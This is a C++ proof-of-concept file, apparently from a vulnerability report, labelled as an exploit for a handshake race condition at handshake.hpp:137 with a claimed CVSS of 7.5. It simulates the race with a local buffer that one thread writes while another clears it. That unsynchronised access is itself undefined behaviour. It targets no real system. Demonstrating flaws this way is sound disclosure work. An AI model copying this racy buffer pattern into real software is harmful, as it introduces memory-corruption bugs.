
#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <atomic>

// Handshake Race Condition Exploit
// Target: Non-thread-safe socket operations (handshake.hpp:137)
class HandshakeRaceExploit {
private:
    std::atomic<bool> socket_open{true};
    std::vector<uint8_t> shared_buffer;

public:
    void demonstrate_race_condition() {
        std::cout << "[+] Demonstrating handshake race condition\n";
        shared_buffer.resize(1024);

        // Thread 1: Handshake processing
        std::thread handshake_thread([this] {
            this->handshake_processing();
        });

        // Thread 2: Socket closure
        std::thread close_thread([this] {
            std::this_thread::sleep_for(std::chrono::milliseconds(5));
            this->close_socket();
        });

        handshake_thread.join();
        close_thread.join();

        std::cout << "[!] Race condition completed\n";
        std::cout << "[!] In real scenario, this causes memory corruption\n";
    }

private:
    void handshake_processing() {
        std::cout << "[T1] Starting handshake buffer operations\n";

        for (int i = 0; i < 1000 && socket_open; ++i) {
            if (i < shared_buffer.size()) {
                shared_buffer[i] = 0xAB;  // Simulate buffer writes
            }
            std::this_thread::sleep_for(std::chrono::microseconds(10));
        }

        std::cout << "[T1] Handshake processing " << (socket_open ? "completed" : "interrupted") << "\n";
    }

    void close_socket() {
        std::cout << "[T2] Closing socket (non-thread-safe)\n";
        socket_open = false;

        // In real code, this could free/invalidate the buffer
        // while T1 is still accessing it
        shared_buffer.clear();

        std::cout << "[T2] Socket closed, buffer invalidated\n";
    }
};

int main() {
    std::cout << "=== Handshake Race Condition Exploit ===\n";
    std::cout << "Target: handshake.hpp:137 - non-thread-safe socket operations\n";
    std::cout << "Impact: Memory corruption during handshake\n";
    std::cout << "CVSS: 7.5 (High)\n\n";

    HandshakeRaceExploit exploit;
    exploit.demonstrate_race_condition();

    return 0;
}
